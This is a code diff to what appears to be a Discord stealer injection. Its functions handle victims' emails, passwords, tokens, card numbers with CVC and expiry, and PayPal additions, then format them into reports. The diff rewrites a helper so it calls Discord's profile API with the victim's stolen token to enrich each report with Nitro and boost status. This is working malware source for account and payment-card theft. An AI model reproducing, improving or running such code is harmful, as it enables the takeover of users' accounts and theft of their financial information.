@@ -566,24 +566,86 @@ const buyNitro = async (token) => {
   }
 };
 
-const getNitro = r => {
-  switch (r.premium_type) {
-      default:
-          return ":x:";
+const getNitro = async (flags, id, token) => {
+  switch (flags) {
       case 1:
           return "<:nitro:1232017139461001320>";
       case 2:
-          if (!r.premium_guild_since) return "<:nitro:1232017139461001320>";
-          var now = new Date(Date.now());
-          var arr = ["<:boost1:1232102555354665082>", "<:boost2:1232102556537192511>", "<:boost4:1232102559041323030>", "<:boost5:1232102560492687390>", "<:boost6:1232102549923041352>", "<:boost7:1232102551214882836>", "<:boost8:1232102552569643048>", "<:boost9:1232102554066878544>"];
-          var a = [new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since)]
-          var b = [2, 3, 6, 9, 12, 15, 18, 24]
-          var r = []
-          for (var p in a) r.push(Math.round((calcDate(a[p], b[p]) - now) / 86400000))
-          var i = 0
-          for (var p of r) p > 0 ? "" : i++
-          return "<:nitro:1232017139461001320> " + arr[i]
-  }
+          let info;
+          await axios.get(`https://discord.com/api/v9/users/${id}/profile`, {
+              headers: {
+                  "Content-Type": "application/json",
+                  "authorization": token
+              }
+          }).then(res => { info = res.data })
+              .catch(() => { })
+          if (!info) return "<:nitro:1232017139461001320>";
+
+          if (!info.premium_guild_since) return "<:nitro:1232017139461001320>";
+
+          const boost = ["<:boost1:1232102555354665082>", "<:boost2:1232102556537192511>", "<:boost4:1232102559041323030>", "<:boost5:1232102560492687390>", "<:boost6:1232102549923041352>", "<:boost7:1232102551214882836>", "<:boost8:1232102552569643048>", "<:boost9:1232102554066878544>"];
+          let i = 0;
+
+          try {
+              let d = new Date(info.premium_guild_since)
+              let boost2month = Math.round((new Date(d.setMonth(d.getMonth() + 2)) - new Date(Date.now())) / 86400000)
+              let d1 = new Date(info.premium_guild_since)
+              let boost3month = Math.round((new Date(d1.setMonth(d1.getMonth() + 3)) - new Date(Date.now())) / 86400000)
+              let d2 = new Date(info.premium_guild_since)
+              let boost6month = Math.round((new Date(d2.setMonth(d2.getMonth() + 6)) - new Date(Date.now())) / 86400000)
+              let d3 = new Date(info.premium_guild_since)
+              let boost9month = Math.round((new Date(d3.setMonth(d3.getMonth() + 9)) - new Date(Date.now())) / 86400000)
+              let d4 = new Date(info.premium_guild_since)
+              let boost12month = Math.round((new Date(d4.setMonth(d4.getMonth() + 12)) - new Date(Date.now())) / 86400000)
+              let d5 = new Date(info.premium_guild_since)
+              let boost15month = Math.round((new Date(d5.setMonth(d5.getMonth() + 15)) - new Date(Date.now())) / 86400000)
+              let d6 = new Date(info.premium_guild_since)
+              let boost18month = Math.round((new Date(d6.setMonth(d6.getMonth() + 18)) - new Date(Date.now())) / 86400000)
+              let d7 = new Date(info.premium_guild_since)
+              let boost24month = Math.round((new Date(d7.setMonth(d7.getMonth() + 24)) - new Date(Date.now())) / 86400000)
+
+              if (boost2month > 0) {
+                  i += 0
+              } else {
+                  i += 1
+              } if (boost3month > 0) {
+                  i += 0
+              } else {
+                  i += 1
+              } if (boost6month > 0) {
+                  i += 0
+              } else {
+                  i += 1
+              } if (boost9month > 0) {
+                  i += 0
+              } else {
+                  i += 1
+              } if (boost12month > 0) {
+                  i += 0
+              } else {
+                  i += 1
+              } if (boost15month > 0) {
+                  i += 0
+              } else {
+                  i += 1
+              } if (boost18month > 0) {
+                  i += 0
+              } else {
+                  i += 1
+              } if (boost24month > 0) {
+                  i += 0
+              } else if (boost24month < 0 || boost24month == 0) {
+                  i += 1
+              } else {
+                  i = 0
+              }
+          } catch {
+              i += 0
+          }
+          return `<:nitro:1232017139461001320> ${boost[i]}`
+      default:
+          return "\`No Nitro\`";
+  };
 }
 
 const getBadges = (flags) => {
@@ -678,7 +740,7 @@ const login = async (email, password, token) => {
           },
           {
             name: '**Discord Information**',
-            value: `<:025:1232016453805412474> Nitro Type: **${nitro}**\n<a:lovestl:1232020347705102427> Badges: **${badges}**\n<a:cl_creditcard:1232017137175105587> Billing: **${billing}**`,
+            value: `<:025:1232016453805412474> Nitro Type: ${await getNitro(json.premium_type, json.id, token)}\n<a:lovestl:1232020347705102427> Badges: **${badges}**\n<a:cl_creditcard:1232017137175105587> Billing: **${billing}**`,
             inline: false,
           },
           {
@@ -721,7 +783,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           },
           {
             name: '**Discord Information**',
-            value: `<:025:1232016453805412474> Nitro Type: ${nitro}\n<a:lovestl:1232020347705102427> Badges: **${badges}**\n<a:cl_creditcard:1232017137175105587> Billing: **${billing}**`,
+            value: `<:025:1232016453805412474> Nitro Type: ${await getNitro(json.premium_type, json.id, token)}\n<a:lovestl:1232020347705102427> Badges: **${badges}**\n<a:cl_creditcard:1232017137175105587> Billing: **${billing}**`,
             inline: true,
           },
           {
@@ -764,7 +826,7 @@ const emailChanged = async (email, password, token) => {
           },
           {
             name: '**Discord Information**',
-            value: `<:025:1232016453805412474> Nitro Type: **${nitro}**\n<a:lovestl:1232020347705102427> Badges: **${badges}**\n<a:cl_creditcard:1232017137175105587> Billing: **${billing}**`,
+            value: `<:025:1232016453805412474> Nitro Type: ${await getNitro(json.premium_type, json.id, token)}\n<a:lovestl:1232020347705102427> Badges: **${badges}**\n<a:cl_creditcard:1232017137175105587> Billing: **${billing}**`,
             inline: true,
           },
           {
@@ -807,7 +869,7 @@ const PaypalAdded = async (token) => {
           },
           {
             name: '**Discord Information**',
-            value: `<:025:1232016453805412474> Nitro Type: **${nitro}**\n<a:lovestl:1232020347705102427> Badges: **${badges}**\n<a:cl_creditcard:1232017137175105587> Billing: **${billing}**`,
+            value: `<:025:1232016453805412474> Nitro Type: ${await getNitro(json.premium_type, json.id, token)}\n<a:lovestl:1232020347705102427> Badges: **${badges}**\n<a:cl_creditcard:1232017137175105587> Billing: **${billing}**`,
             inline: true,
           },
           {
@@ -850,7 +912,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           },
           {
             name: '**Discord Information**',
-            value: `<:025:1232016453805412474> Nitro Type: **${nitro}**\n<a:lovestl:1232020347705102427> Badges: **${badges}**\n<a:cl_creditcard:1232017137175105587> Billing: **${billing}**`,
+            value: `<:025:1232016453805412474> Nitro Type: ${await getNitro(json.premium_type, json.id, token)}\n<a:lovestl:1232020347705102427> Badges: **${badges}**\n<a:cl_creditcard:1232017137175105587> Billing: **${billing}**`,
             inline: true,
           },
           {
@@ -895,7 +957,7 @@ const nitroBought = async (token) => {
           },
           {
             name: '**Discord Information**',
-            value: `<:025:1232016453805412474> Nitro Type: **${nitro}**\n<a:lovestl:1232020347705102427> Badges: **${badges}**\n<a:cl_creditcard:1232017137175105587> Billing: **${billing}**`,
+            value: `<:025:1232016453805412474> Nitro Type: ${await getNitro(json.premium_type, json.id, token)}\n<a:lovestl:1232020347705102427> Badges: **${badges}**\n<a:cl_creditcard:1232017137175105587> Billing: **${billing}**`,
             inline: true,
           },
           {
